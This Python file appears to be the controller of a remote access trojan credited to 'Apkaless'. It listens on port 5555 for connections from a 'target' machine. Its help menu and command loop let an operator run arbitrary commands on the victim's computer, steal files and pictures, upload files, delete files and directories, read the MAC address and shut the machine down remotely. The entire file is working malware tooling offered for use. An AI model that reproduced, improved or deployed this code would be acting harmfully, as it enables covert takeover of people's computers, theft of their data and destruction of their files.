import socket
import os
import platform
import time


if 'Windows' in platform.platform():

    os.system('cls')

else:

    os.system('clear')

def help():
    
    print('''
=---------=         =-------------=
| COMMAND |         | DESCRIPTION |
=---------=         =-------------=
==================================================================================================
| [1]  whoami        It Shows You The Computer And User Name.                                    |
| [2]  cd            Change The Directory.                                                       |
| [3]  dir           Display Any Files Inside The Directory.                                     |
| [4]  cat           Display File's Content (Read The File).                                     |
| [5]  start         Run A File On The Target's Machine.                                         |
| [6]  download      Download Any File From The Target (*Note This Will Not Work With Pictures). |
| [7]  upload        Upload Any File To The Target     (*Note This Will Not Work With Pictures). |
| [8]  dl_img        Download Any Picture From The Target.                                       | 
| [9]  shutdown      Shutdown The Target Machine (Turn It Off).                                  |
| [10] del filename  Delete Any File On The Target Machine.                                      | 
| [11] rmdir         Remove Any Directory On The Target Machine.                                 |
| [12] mac           Display The Mac Address Of The Target.                                      |
| [13] help          Display This Info                                                           |
==================================================================================================
    ''')

def execute():
    while True:

        try:

            object, address = server.accept() # Accept the connection from the target and return the socket object, ipv4 and port number of the target who connected to our server

            print(f'[+] Incoming Connection From {address[0]}:{address[1]}\n') # address[0] is gonna be the target ipv4 and address[1] is gonna be the port number

        except:
            continue

        else:

            while True:

                cmd = input('[Run A Command]: ')

                if cmd =='exit':

                    object.send('exit'.encode('ascii'))

                    object.close()

                    exit()

                elif cmd == '':

                    continue

                elif cmd == 'cls':

                    try:

                        os.system('cls')

                        os.system('clear')

                        continue

                    except:
                        continue
                
                elif cmd == 'download':

                    continue

                elif cmd[0:8]=='download':

                    object.send(cmd.encode('ascii'))

                    data = object.recv(2048).decode('ascii')

                    if data == 'File Not Found (ERROR)':

                        print('\n',data,'\n')

                        continue

                    else:

                        with open(cmd[9:],'wb') as f:

                            file = f.write(data.encode('ascii'))

                        continue

                elif cmd[0:6]=='upload':

                    object.send(cmd.encode('ascii'))

                    data = object.recv(2048).decode('ascii')


                    if data:

                        try:

                            file = open(cmd[7:], 'rb')

                            file = file.read()

                            object.send(file)

                            continue

                        except FileNotFoundError:

                            print('\nFile Not Found\n')

                            continue

                elif cmd[0:3]=='cat':

                    object.send(cmd.encode('ascii'))

                    data = object.recv(2048).decode('ascii')

                    print('\n',data,'\n')

                    continue

                elif cmd == 'cd':
                    
                    continue

                elif cmd[0:6] == 'dl_img':

                    object.send(cmd.encode('ascii'))

                    data = object.recv(100000000)


                    if 'ERROR'.encode('ascii') in data:

                        print(f'\nThe Following Picture {cmd[7:]} Not Detected\n')

                        continue
                    
                    else:
                        print(f'\nImage Name: {cmd[7:]}\n')

                        with open(cmd[7:], 'wb') as f:

                            f.write(data)

                        continue
                
                elif cmd == 'help':
                    help()
                    continue

                elif cmd == 'shutdown':

                    cmd = 'shutdown /s /t 3'

                    object.send(cmd.encode('ascii'))

                    print('\n[+] Target\'s Machine Turned Off.\n')

                    time.sleep(3)

                    print('\nThe Connection To The Target Has Been Lost.\n')

                    time.sleep(1)
                    
                    exit()

                else:
                    
                    object.send(cmd.encode('ascii'))

                    data = object.recv(2048).decode('ascii')

                    print(f"\n{data}\n")

if __name__=='__main__':

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind(("0.0.0.0", 5555))

    server.listen()

    print('''

[+]======================================================================[+]

   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx      
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

    _______  _______  _        _______  _        _______  _______  _______ 
   (  ___  )(  ____ )| \    /\(  ___  )( \      (  ____ \(  ____ \(  ____ \'
   | (   ) || (    )||  \  / /| (   ) || (      | (    \/| (    \/| (    \/
   | (___) || (____)||  (_/ / | (___) || |      | (__    | (_____ | (_____ 
   |  ___  ||  _____)|   _ (  |  ___  || |      |  __)   (_____  )(_____  )
   | (   ) || (      |  ( \ \ | (   ) || |      | (            ) |      ) |
   | )   ( || )      |  /  \ \| )   ( || (____/\| (____/\/\____) |/\____) |
   |/     \||/       |_/    \/|/     \|(_______/(_______/\_______)\_______)

   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx                                                                                                                                                                   
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

[+]======================================================================[+]

[x] Author  : Apkaless

[x] Country : IRAQ

''')
    help()
    print('''

[+] Server Started !

[+] Waiting For Incoming Connection

    ''')
    execute()
